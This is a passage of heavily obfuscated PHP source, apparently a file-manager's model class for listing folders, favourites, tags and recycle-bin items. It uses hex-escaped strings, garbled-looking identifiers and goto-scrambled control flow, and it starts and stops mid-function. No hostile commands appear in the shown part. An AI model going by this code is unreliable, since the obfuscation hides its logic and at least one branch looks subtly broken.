$B¯¡Ø‚ßéâ, $B‡ˆ¿¥âÓ); $this->set($a•‰„ƒ¿š[0], $A¡Ü¡é•¨©[$a•‰„ƒ¿š[0]], $c‡éƒ¾Üë¹); } public function remove($d˜Ã¼‡Îğ², $F‘à¼šÊ³ = '') { $d·˜Õ·‚ê =& $_SERVER[¢Í]; $this->cacheRemove($F‘à¼šÊ³); $dğ›ÍÂ¼Œ¯ = $this->filterWhere(array($d·˜Õ·‚ê[99] => $d˜Ã¼‡Îğ², $d·˜Õ·‚ê[29] => $F‘à¼šÊ³)); if (is_null($d˜Ã¼‡Îğ²)) { unset($dğ›ÍÂ¼Œ¯[$d·˜Õ·‚ê[99]]); } return $this->where($dğ›ÍÂ¼Œ¯)->delete(); } public function cacheSet($bÇ”¾ò¬ ğ, $b‚êŞ·½‘ = false) { return Cache::set($this->cacheKey($bÇ”¾ò¬ ğ), $b‚êŞ·½‘); } public function cacheGet($cœÙòªËò¼) { return Cache::get($this->cacheKey($cœÙòªËò¼)); } public function cacheRemove($cë¼ÙİÆ–) { return Cache::remove($this->cacheKey($cë¼ÙİÆ–)); } protected function filterWhere($dÒ¤Ÿ£Şª) { return $dÒ¤Ÿ£Şª; } protected function cacheKey($cŒ¤§ß‹£) { return $cŒ¤§ß‹£; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\145" => "\x69\157\137\163\x6f\x75\x72\143\x65\137\155\x65\x74\141", "\155\145\x74\141\106\x69\x65\154\144" => "\x73\157\165\x72\143\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\146\171\x54\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\156\x63\164\x69\x6f\156"), array("\x63\162\145\141\x74\x65\x54\151\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\146\165\156\143\x74\x69\x6f\156"), array("\x76\x69\x65\x77\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\162\x74", "\x66\165\156\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($B´³Áš‘½») { return $this->listSource(array($_SERVER[¢Í][393] => $B´³Áš‘½»)); } public function typeName($BÓà‹º¦°‚) { static $bô’±øĞÚ¤ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\155", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $bô’±øĞÚ¤[$BÓà‹º¦°‚ . $_SERVER[¢Í][33]]; } public function sourceListInfo($AÈ³¦Ò½îË, $a†ãÊœåÙÖ = false) { goto d†‰÷‚“­; böç×Âß–¸: return array_to_keyvalue($BØš®·È¼©, $CÉÏÎ­ç£â[394]); goto aÆ‰Î¡µ£®; d†‰÷‚“­: $CÉÏÎ­ç£â =& $_SERVER[¢Í]; $AÈ³¦Ò½îË = $AÈ³¦Ò½îË ? $AÈ³¦Ò½îË : array(); $AÈ³¦Ò½îË = array_filter(array_unique($AÈ³¦Ò½îË)); goto eìé›‹Î…õ; eìé›‹Î…õ: if (!$AÈ³¦Ò½îË) { return array(); } $BØš®·È¼© = $this->where(array($CÉÏÎ­ç£â[394] => array($CÉÏÎ­ç£â[7], $AÈ³¦Ò½îË)))->select(); $this->_listDataApply($BØš®·È¼©, $a†ãÊœåÙÖ); goto böç×Âß–¸; aÆ‰Î¡µ£®: } public function pathInfoFilter($D‘ó‚·ÙÜ¶) { goto E½âíÇµ¡; cñ®¯‰Ó¬Ò: $cŸÜùÁß…Á .= $B—Ç÷ö¬ˆÎ[399]; $cŸÜùÁß…Á .= $B—Ç÷ö¬ˆÎ[400]; $BªÔ¬”«Ñ“ = explode($B—Ç÷ö¬ˆÎ[47], $cŸÜùÁß…Á); goto CëÉÅ–Ùë‰; dÏˆ¸íé‹ª: $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[396]] = $this->typeName($D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[396]]); if ($D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[395]] != 1) { $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[175]] = $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[397]]; unset($D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[397]]); } $cŸÜùÁß…Á = $B—Ç÷ö¬ˆÎ[398]; goto cñ®¯‰Ó¬Ò; E½âíÇµ¡: $B—Ç÷ö¬ˆÎ =& $_SERVER[¢Í]; $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[85]] = KodIO::make($D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[394]]); $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[29]] = $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[395]] == 1 ? $B—Ç÷ö¬ˆÎ[86] : $B—Ç÷ö¬ˆÎ[181]; goto dÏˆ¸íé‹ª; CëÉÅ–Ùë‰: if (isset($D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[401]]) && $D‘ó‚·ÙÜ¶[$B—Ç÷ö¬ˆÎ[401]][$B—Ç÷ö¬ˆÎ[402]] == -1) { $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[200]); $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[117]); $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[403]); $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[404]); $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[87]); $BªÔ¬”«Ñ“ = array_remove_value($BªÔ¬”«Ñ“, $B—Ç÷ö¬ˆÎ[405]); } $D‘ó‚·ÙÜ¶ = array_field_key($D‘ó‚·ÙÜ¶, $BªÔ¬”«Ñ“); return $D‘ó‚·ÙÜ¶; goto añªÈÏ; añªÈÏ: } public function listUserFav() { goto A„»”ëÊÂ±; A„»”ëÊÂ±: $b¸Ç‹º¢ÈŒ =& $_SERVER[¢Í]; $eÎèõ „ì = Model($b¸Ç‹º¢ÈŒ[406])->listData(); $B¼²é¡½¢ = array_filter_by_field($eÎèõ „ì, $b¸Ç‹º¢ÈŒ[29], $b¸Ç‹º¢ÈŒ[407]); goto C›Í¨’Ÿ„; D²¸»­İ: foreach ($eÎèõ „ì as &$fíÑª‰œÛö) { $fíÑª‰œÛö = array($b¸Ç‹º¢ÈŒ[410] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[392]], $b¸Ç‹º¢ÈŒ[411] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[28]], $b¸Ç‹º¢ÈŒ[412] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[85]], $b¸Ç‹º¢ÈŒ[413] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[29]], $b¸Ç‹º¢ÈŒ[414] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[200]], $b¸Ç‹º¢ÈŒ[415] => $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[117]]); if ($fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[29]] == $b¸Ç‹º¢ÈŒ[407] && $E™‡­êÄÚ[$fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[85]]]) { $fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[416]] = $E™‡­êÄÚ[$fíÑª‰œÛö[$b¸Ç‹º¢ÈŒ[85]]]; } } unset($fíÑª‰œÛö); return $eÎèõ „ì; goto F¡ø˜Õ‚°; C›Í¨’Ÿ„: $B¼²é¡½¢ = array_to_keyvalue($B¼²é¡½¢, $b¸Ç‹º¢ÈŒ[33], $b¸Ç‹º¢ÈŒ[85]); if ($B¼²é¡½¢) { $E™‡­êÄÚ = $this->listSource(array($b¸Ç‹º¢ÈŒ[408] => array($b¸Ç‹º¢ÈŒ[409], $B¼²é¡½¢))); } $E™‡­êÄÚ = array_to_keyvalue($E™‡­êÄÚ[$b¸Ç‹º¢ÈŒ[370]], $b¸Ç‹º¢ÈŒ[394]); goto D²¸»­İ; F¡ø˜Õ‚°: } public function listUserTag($cê‰œ‚ïË) { goto BŠõ¦ÙğĞÔ; Fá„Ú½šË‘: $AğÆâã·ê = array_to_keyvalue($Cóá„ù½µÏ[$e¢¹„å¼”×[83]], $e¢¹„å¼”×[33], $e¢¹„å¼”×[394]); $E¸ÚÍàå¶„ = array_merge($AğÆâã·ê, $b˜Õ†¹Šé); foreach ($b¸ß‹Å¢Ó« as $C˜³¤º·ø) { if (!in_array($C˜³¤º·ø, $E¸ÚÍàå¶„)) { $BÅ‡Àœ[] = $C˜³¤º·ø; } } goto c†ÁãÌÑ¥¬; Fâ‹š…È¾…: if (!$Cóá„ù½µÏ || count($b¸ß‹Å¢Ó«) == $Cóá„ù½µÏ[$e¢¹„å¼”×[367]][$e¢¹„å¼”×[368]]) { return $Cóá„ù½µÏ; } $BÅ‡Àœ = array(); $b˜Õ†¹Šé = array_to_keyvalue($Cóá„ù½µÏ[$e¢¹„å¼”×[84]], $e¢¹„å¼”×[33], $e¢¹„å¼”×[394]); goto Fá„Ú½šË‘; e’Œ†…‹¦: foreach ($EøÂÇÈ÷£Í as $eÙÂë÷ãËá => $fŞ—‚¦×”) { $AˆÚàÌ‘¹ = !0; if (!$cê‰œ‚ïË) { $b¸ß‹Å¢Ó«[] = $eÙÂë÷ãËá; continue; } foreach ($cê‰œ‚ïË as $AöçŒ™ÁµÖ) { if (!in_array($AöçŒ™ÁµÖ, $fŞ—‚¦×”)) { $AˆÚàÌ‘¹ = !1; break; } } if ($AˆÚàÌ‘¹) { $b¸ß‹Å¢Ó«[] = $eÙÂë÷ãËá; } } if (!$b¸ß‹Å¢Ó«) { return array(); } $Cóá„ù½µÏ = $this->listSource(array($e¢¹„å¼”×[408] => array($e¢¹„å¼”×[409], $b¸ß‹Å¢Ó«))); goto Fâ‹š…È¾…; BŠõ¦ÙğĞÔ: $e¢¹„å¼”× =& $_SERVER[¢Í]; if ($cê‰œ‚ïË && !is_array($cê‰œ‚ïË)) { $cê‰œ‚ïË = array($cê‰œ‚ïË); } $cŞï¹ù¡²© = Model($e¢¹„å¼”×[417])->listData(); goto E„àêÚñÈ…; E„àêÚñÈ…: $EøÂÇÈ÷£Í = array(); foreach ($cŞï¹ù¡²© as $b×›Î¤óÍÏ) { $C˜³¤º·ø = $b×›Î¤óÍÏ[$e¢¹„å¼”×[85]]; if (!$C˜³¤º·ø) { continue; } if (!isset($EøÂÇÈ÷£Í[$C˜³¤º·ø])) { $EøÂÇÈ÷£Í[$C˜³¤º·ø] = array(); } $EøÂÇÈ÷£Í[$C˜³¤º·ø][] = $b×›Î¤óÍÏ[$e¢¹„å¼”×[418]]; } $b¸ß‹Å¢Ó« = array(); goto e’Œ†…‹¦; c†ÁãÌÑ¥¬: if ($BÅ‡Àœ) { Model($e¢¹„å¼”×[419])->removeBySource($BÅ‡Àœ); } return $Cóá„ù½µÏ; goto c‘ÚĞ×´ò; c‘ÚĞ×´ò: } public function listUserRecycle() { $Fóãõ½ªîĞ =& $_SERVER[¢Í]; $a¡® ­®¦º = Model($Fóãõ½ªîĞ[420])->listData(); if (!$a¡® ­®¦º) { return array(); } $d¾Ù¯ÇäŸá = array($Fóãõ½ªîĞ[408] => array($Fóãõ½ªîĞ[409], $a¡® ­®¦º), $Fóãõ½ªîĞ[421] => 1); return $this->listSource($d¾Ù¯ÇäŸá); } public function listSource($C°»òÉèõ, $aÀŒèÇğ“ = 3000) { goto EêçŠ—š±æ; EêçŠ—š±æ: $eÓÕß¿Şæ =& $_SERVER[¢Í]; if (!isset($C°»òÉèõ[$eÓÕß¿Şæ[422]])) { $C°»òÉèõ[$eÓÕß¿Şæ[422]] = 0; } $Dè¬´£‡ˆ· = $eÓÕß¿Şæ[423]; goto aÔ¯±éÌØ÷; aÔ¯±éÌØ÷: $B‘ÔÊ‘¡Åá = $this->field($Dè¬´£‡ˆ·)->_makeOrder()->where($C°»òÉèõ)->selectPage($aÀŒèÇğ“); $this->_listDataApply($B‘ÔÊ‘¡Åá[$eÓÕß¿Şæ[370]]); $this->_listMake($B‘ÔÊ‘¡Åá); goto dÈ ”ÁÓ¼£; dÈ ”ÁÓ¼£: return $B‘ÔÊ‘¡Åá; goto a”Ş‰±É‰; a”Ş‰±É‰: } protected function _makeOrder() { goto BŠ¬ÛÁ‘; bÈŸÇ£…Ú¤: $B½ôåŒ½Ø« = array($E‚İàÊ÷ó[427] => $E‚İàÊ÷ó[428], $E‚İàÊ÷ó[429] => $E‚İàÊ÷ó[430]); $FÑÈ÷äø = array($E‚İàÊ÷ó[28] => $E‚İàÊ÷ó[28], $E‚İàÊ÷ó[87] => $E‚İàÊ÷ó[87], $E‚İàÊ÷ó[175] => $E‚İàÊ÷ó[397], $E‚İàÊ÷ó[403] => $E‚İàÊ÷ó[403], $E‚İàÊ÷ó[431] => $E‚İàÊ÷ó[404], $E‚İàÊ÷ó[200] => $E‚İàÊ÷ó[200], $E‚İàÊ÷ó[117] => $E‚İàÊ÷ó[117]); $D†Š§‰™Ğİ = Input::get($E‚İàÊ÷ó[432], $E‚İàÊ÷ó[7], $aØ¤ÛØÆ•², array_keys($FÑÈ÷äø)); goto dè’ö‚‘Ï×; BŠ¬ÛÁ‘: $E‚İàÊ÷ó =& $_SERVER[¢Í]; $aØ¤ÛØÆ•² = Model($E‚İàÊ÷ó[424])->get($E‚İàÊ÷ó[425]); $aÙ¿İŸ£•­ = Model($E‚İàÊ÷ó[424])->get($E‚İàÊ÷ó[426]); goto bÈŸÇ£…Ú¤; dè’ö‚‘Ï×: $DŸó™¹æ´ = Input::get($E‚İàÊ÷ó[433], $E‚İàÊ÷ó[7], $aÙ¿İŸ£•­, array_keys($B½ôåŒ½Ø«)); if (!in_array($D†Š§‰™Ğİ, array_keys($FÑÈ÷äø))) { $D†Š§‰™Ğİ = $E‚İàÊ÷ó[28]; } if (!in_array($DŸó™¹æ´, array_keys($B½ôåŒ½Ø«))) { $D†Š§‰™Ğİ = $E‚İàÊ÷ó[427]; } goto AÏêìğª; AÏêìğª: if ($D†Š§‰™Ğİ == $E‚İàÊ÷ó[28]) { } $aîÓŠ¥¤Ö‰ = $E‚İàÊ÷ó[434] . $FÑÈ÷äø[$D†Š§‰™Ğİ] . $E‚İàÊ÷ó[50] . $B½ôåŒ½Ø«[$DŸó™¹æ´]; return $this->order(rtrim(trim($aîÓŠ¥¤Ö‰), $E‚İàÊ÷ó[47])); goto EËÒäŸ³ê; EËÒäŸ³ê: } protected function _listDataApplyItem($e¨ó¿åÔÍ, $Aóã‘«»ã = false) { $dÈ“ëùñÙ… = array($e¨ó¿åÔÍ); $this->_listDataApply($dÈ“ëùñÙ…, $Aóã‘«»ã); return $dÈ“ëùñÙ…[0]; } protected function _listDataApply(&$cğ½¨ù…’è, $Cš—£çÛÑè = false) { goto bñÎõíÒ¸Š; f¥á­µÜ—Ó: $this->_listAppendPath($cğ½¨ù…’è); $this->_listAppendAuth($cğ½¨ù…’è); $this->_listAppendSourceInfo($cğ½¨ù…’è, $fÙ®‰ÅÇ’ª); goto aÓçëÙèº; EÛïÑÙãˆ: $fÙ®‰ÅÇ’ª = array_unique($fÙ®‰ÅÇ’ª); $this->_listSourceCache($cğ½¨ù…’è); if (!$Cš—£çÛÑè) { $this->_listAppendMeta($cğ½¨ù…’è, $fÙ®‰ÅÇ’ª); $this->_listAppendFileMeta($cğ½¨ù…’è, $fÙ®‰ÅÇ’ª); $this->_listAppendChildren($cğ½¨ù…’è, $fÙ®‰ÅÇ’ª); } goto f¥á­µÜ—Ó; aÓçëÙèº: $this->_listAppendUser($cğ½¨ù…’è); $this->_listFilterInfo($cğ½¨ù…’è, $Cš—£çÛÑè); goto b‚…ÅÍòÛ¹; bñÎõíÒ¸Š: $aÆ™Ãáë›á =& $_SERVER[¢Í]; if (!$cğ½¨ù…’è) { $cğ½¨ù…’è = array(); return; } $fÙ®‰ÅÇ’ª = array_to_keyvalue($cğ½¨ù…’è, $aÆ™Ãáë›á[33], $aÆ™Ãáë›á[394]); goto EÛïÑÙãˆ; b‚…ÅÍòÛ¹: } protected function _listSourceCache($Ašºõ¬›Ø») { $eŠšˆÄ¡†™ =& $_SERVER[¢Í]; foreach ($Ašºõ¬›Ø» as $B’ŒõºÜå¦) { self::$cacheSourceInfo[$eŠšˆÄ¡†™[435] . $B’ŒõºÜå¦[$eŠšˆÄ¡†™[394]]] = $B’ŒõºÜå¦; } } protected function _listFilterInfo(&$F»‘Áê‡ë™, $dš®’ÅÈ¥© = false) { $BøğÊò†å¨ =& $_SERVER[¢Í]; foreach ($F»‘Áê‡ë™ as &$CİÓ æàëÑ) { $CİÓ æàëÑ = $this->pathInfoFilter($CİÓ æàëÑ); self::$cachePathInfo[$BøğÊò†å¨[436] . intval($dš®’ÅÈ¥©) . $BøğÊò†å¨[437] . $CİÓ æàëÑ[$BøğÊò†å¨[394]]] = $CİÓ æàëÑ; } unset($CİÓ æàëÑ); } protected function _listMake(&$fÄÉ‰¦•£«) { $D…·˜ÚÁ×Û =& $_SERVER[¢Í]; $fÄÉ‰¦•£«[$D…·˜ÚÁ×Û[84]] = array(); $fÄÉ‰¦•£«[$D…·˜ÚÁ×Û[83]] = array(); foreach ($fÄÉ‰¦•£«[$D…·˜ÚÁ×Û[370]] as $bˆÜ–œ‚½Â) { $E”ÀÅ•ïô· = $bˆÜ–œ‚½Â[$D…·˜ÚÁ×Û[395]] == 1 ? $D…·˜ÚÁ×Û[84] : $D…·˜ÚÁ×Û[83]; $fÄÉ‰¦•£«[$E”ÀÅ•ïô·][] = $bˆÜ–œ‚½Â; } unset($fÄÉ‰¦•£«[$D…·˜ÚÁ×Û[370]]); } protected function _listAppendMeta(&$c†ÂİÓê’, $BÀšù½í¯) { goto bƒ¹Î”ò³å; A˜Í§Š÷Ô: if (!$Aå¹Ô…°·˜) { return; } $f÷ƒ¦éŸØ = array($e­ÛÉøÄÔè[440], $e­ÛÉøÄÔè[441]); $aöõç™×’ = array(); goto b¸õÌ„Õò¸; b¸õÌ„Õò¸: foreach ($Aå¹Ô…°·˜ as $a™èÕÚ§İ¤) { if (!isset($aöõç™×’[$a™èÕÚ§İ¤[$e­ÛÉøÄÔè[394]]])) { $aöõç™×’[$a™èÕÚ§İ¤[$e­ÛÉøÄÔè[394]]] = array(); } if (in_array($a™èÕÚ§İ¤[$e­ÛÉøÄÔè[99]], $f÷ƒ¦éŸØ)) { continue; } $aöõç™×’[$a™èÕÚ§İ¤[$e­ÛÉøÄÔè[394]]][$a™èÕÚ§İ¤[$e­ÛÉøÄÔè[99]]] = $a™èÕÚ§İ¤[$e­ÛÉøÄÔè[375]]; } foreach ($c†ÂİÓê’ as &$aŠš½ŞÀ¢Ğ) { $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[442]] = !1; if (isset($aöõç™×’[$aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[394]]])) { $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[442]] = $aöõç™×’[$aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[394]]]; } if ($this->fileIsLock($aŠš½ŞÀ¢Ğ) && $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[401]]) { $aİæâ¡¯ø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[401]][$e­ÛÉøÄÔè[402]] = AuthModel::authDisable($aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[401]][$e­ÛÉøÄÔè[402]], $aİæâ¡¯ø); $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[401]][$e­ÛÉøÄÔè[443]][$e­ÛÉøÄÔè[401]] = $aŠš½ŞÀ¢Ğ[$e­ÛÉøÄÔè[401]][$e­ÛÉøÄÔè[402]]; } } unset($aŠš½ŞÀ¢Ğ); goto AË¦Š„†ó„; bƒ¹Î”ò³å: $e­ÛÉøÄÔè =& $_SERVER[¢Í]; $DÁŒËæì¸Ü = array($e­ÛÉøÄÔè[408] => array($e­ÛÉøÄÔè[409], $BÀšù½í¯)); $Aå¹Ô…°·˜ = Model($e­ÛÉøÄÔè[438])->field($e­ÛÉøÄÔè[439])->where($DÁŒËæì¸Ü)->select(); goto A˜Í§Š÷Ô; AË¦Š„†ó„: } protected function _listAppendFileMeta(&$Aé™¿Ë­ğÕ, $D´œ´ÍĞÂİ) { goto a©‹…Ÿèô—; F…Å›Øïôá: $a„öÁâÈ¾Ã = $a„öÁâÈ¾Ã ? $a„öÁâÈ¾Ã : array(); $DöÚêóš  = array(); foreach ($a„öÁâÈ¾Ã as $Aˆ÷…å‡·…) { if (!isset($DöÚêóš [$Aˆ÷…å‡·…[$cï«Ûóïİ°[444]]])) { $DöÚêóš [$Aˆ÷…å‡·…[$cï«Ûóïİ°[444]]] = array(); } $DöÚêóš [$Aˆ÷…å‡·…[$cï«Ûóïİ°[444]]][$Aˆ÷…å‡·…[$cï«Ûóïİ°[99]]] = $Aˆ÷…å‡·…[$cï«Ûóïİ°[375]]; } goto e¦Á’¾÷…ó; bè³µ“º–Ù: $Dè˜§òİÀÄ = Model($cï«Ûóïİ°[447])->field($AÕ÷Øï½)->where($F¼ÅÄšÈÂá)->select(); $Dè˜§òİÀÄ = array_to_keyvalue($Dè˜§òİÀÄ, $cï«Ûóïİ°[444]); $a„öÁâÈ¾Ã = Model($cï«Ûóïİ°[448])->field($cï«Ûóïİ°[449])->where($F¼ÅÄšÈÂá)->select(); goto F…Å›Øïôá; a©‹…Ÿèô—: $cï«Ûóïİ° =& $_SERVER[¢Í]; $EÆÜÀÀ®¤« = array_to_keyvalue($Aé™¿Ë­ğÕ, $cï«Ûóïİ°[33], $cï«Ûóïİ°[444]); $EÆÜÀÀ®¤« = array_filter(array_unique($EÆÜÀÀ®¤«)); goto FŸä×¹îœ; FŸä×¹îœ: if (!$EÆÜÀÀ®¤«) { return; } $F¼ÅÄšÈÂá = array($cï«Ûóïİ°[445] => array($cï«Ûóïİ°[409], $EÆÜÀÀ®¤«)); $AÕ÷Øï½ = $cï«Ûóïİ°[446]; goto bè³µ“º–Ù; e¦Á’¾÷…ó: foreach ($Aé™¿Ë­ğÕ as &$B´…¦ª±é) { goto AÃÃÕŒ£»; F”œÏÍ Òœ: if (isset($B´…¦ª±é[$cï«Ûóïİ°[171]][$cï«Ûóïİ°[170]])) { $B´…¦ª±é[$cï«Ûóïİ°[170]] = json_decode($B´…¦ª±é[$cï«Ûóïİ°[171]][$cï«Ûóïİ°[170]], !0); unset($B´…¦ª±é[$cï«Ûóïİ°[171]][$cï«Ûóïİ°[170]]); } goto bô÷ˆ¡†½ß; AÃÃÕŒ£»: $e£¤ìÓ÷Ì = $B´…¦ª±é[$cï«Ûóïİ°[444]]; if (!$e£¤ìÓ÷Ì || !isset($Dè˜§òİÀÄ[$e£¤ìÓ÷Ì])) { continue; } $F«Ÿ°Ç–Ú = $Dè˜§òİÀÄ[$e£¤ìÓ÷Ì]; goto d­µ‰°¸¡¾; d­µ‰°¸¡¾: $F«Ÿ°Ç–Ú[$cï«Ûóïİ°[87]] = $B´…¦ª±é[$cï«Ûóïİ°[87]]; $F«Ÿ°Ç–Ú[$cï«Ûóïİ°[28]] = $B´…¦ª±é[$cï«Ûóïİ°[28]]; if (!isset(self::$cacheFileInfo[$cï«Ûóïİ°[450] . $e£¤ìÓ÷Ì])) { self::$cacheFileInfo[$cï«Ûóïİ°[450] . $e£¤ìÓ÷Ì] = array_merge(array(), $F«Ÿ°Ç–Ú); } goto CÆÎî¿‰›; CÆÎî¿‰›: unset($Dè˜§òİÀÄ[$e£¤ìÓ÷Ì][$cï«Ûóïİ°[85]]); $Ağ“´÷ë˜™ = is_array($DöÚêóš [$e£¤ìÓ÷Ì]) ? $DöÚêóš [$e£¤ìÓ÷Ì] : array(); $B´…¦ª±é[$cï«Ûóïİ°[171]] = array_merge($Ağ“´÷ë˜™, $Dè˜§òİÀÄ[$e£¤ìÓ÷Ì]); goto F”œÏÍ Òœ; bô÷ˆ¡†½ß: } unset($B´…¦ª±é); goto e¹»¥Ùéä; e¹»¥Ùéä: } protected function _listAppendSourceInfo(&$E÷åç‚ÖÅ—, $f‡¨µòÁìø) { goto bå‹–¨öÉé; FàŒÑ„¤ğ: $CŠÍª•Ô³˜ = array_to_keyvalue($Aİä¥™Ü¼Ù, $B”­Ä²ˆ´Ü[392]); $c¯¼è î = array_to_keyvalue_group($CöÅÇÚÆ›Ê, $B”­Ä²ˆ´Ü[85], $B”­Ä²ˆ´Ü[418]); $F÷§³Æª = array_to_keyvalue($e¡œÈî¯, $B”­Ä²ˆ´Ü[85]); goto bºª„¯Ïä©; bå‹–¨öÉé: $B”­Ä²ˆ´Ü =& $_SERVER[¢Í]; if (!defined($B”­Ä²ˆ´Ü[451])) { return; } $Aİä¥™Ü¼Ù = Model($B”­Ä²ˆ´Ü[452])->listData(); goto F×Ë·¾Æ‚´; BÑÁİ³ŒŞ“: return $E÷åç‚ÖÅ—; goto Eå‰—ŒÄ‰Ş; bºª„¯Ïä©: $dºÕÍ©—‰è = array_to_keyvalue_group($Cæ‘õ²İ«ê, $B”­Ä²ˆ´Ü[394]); foreach ($E÷åç‚ÖÅ— as &$E³ÎË™»Ó†) { $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]] = array($B”­Ä²ˆ´Ü[454] => 0, $B”­Ä²ˆ´Ü[455] => 0, $B”­Ä²ˆ´Ü[456] => 0); if (isset($F÷§³Æª[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]])) { $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[457]] = 1; $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[458]] = $F÷§³Æª[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]][$B”­Ä²ˆ´Ü[28]]; } if (isset($c¯¼è î[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]])) { $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[459]] = array(); foreach ($c¯¼è î[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]] as $A„¦Û¨°š·) { $F‘Ä×¿â¡¬ = $CŠÍª•Ô³˜[$A„¦Û¨°š·]; $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[459]][] = array($B”­Ä²ˆ´Ü[460] => $F‘Ä×¿â¡¬[$B”­Ä²ˆ´Ü[392]], $B”­Ä²ˆ´Ü[411] => $F‘Ä×¿â¡¬[$B”­Ä²ˆ´Ü[28]], $B”­Ä²ˆ´Ü[461] => $F‘Ä×¿â¡¬[$B”­Ä²ˆ´Ü[462]]); } } if (isset($dºÕÍ©—‰è[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]])) { $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[463]] = array(); foreach ($dºÕÍ©—‰è[$E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[394]]] as $F­Ÿ¯ó™ší) { $E³ÎË™»Ó†[$B”­Ä²ˆ´Ü[416]][$B”­Ä²ˆ´Ü[463]] = array($B”­Ä²ˆ´Ü[464] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[465]], $B”­Ä²ˆ´Ü[466] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[467]], $B”­Ä²ˆ´Ü[468] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[394]], $B”­Ä²ˆ´Ü[469] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[470]], $B”­Ä²ˆ´Ü[471] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[472]], $B”­Ä²ˆ´Ü[473] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[473]], $B”­Ä²ˆ´Ü[474] => $F­Ÿ¯ó™ší[$B”­Ä²ˆ´Ü[474]]); } } } unset($E³ÎË™»Ó†); goto BÑÁİ³ŒŞ“; F×Ë·¾Æ‚´: $CöÅÇÚÆ›Ê = Model($B”­Ä²ˆ´Ü[417])->listData(); $e¡œÈî¯ = Model($B”­Ä²ˆ´Ü[406])->listData(); $Cæ‘õ²İ«ê = Model($B”­Ä²ˆ´Ü[453])->listSimple(); goto FàŒÑ„¤ğ; Eå‰—ŒÄ‰Ş: } protected function _listAppendChildren(&$B‡µ¥àÎ½ë, $E©‡Ë”‚‚‘) { goto aæºˆåŞšì; b«œ¢Ó‘ÔŠ: $dåê¸µÓæĞ = 1024 * 50; $B‡µ¥àÎ½ë = is_array($B‡µ¥àÎ½ë) ? $B‡µ¥àÎ½ë : array(); $e¥ŸîÙ ×¶ = count($B‡µ¥àÎ½ë); goto D«êˆØÑîö; aæºˆåŞšì: $FÛ»Úèö•† =& $_SERVER[¢Í]; $cø‡ÈˆÂà¬ = $FÛ»Úèö•†[377]; 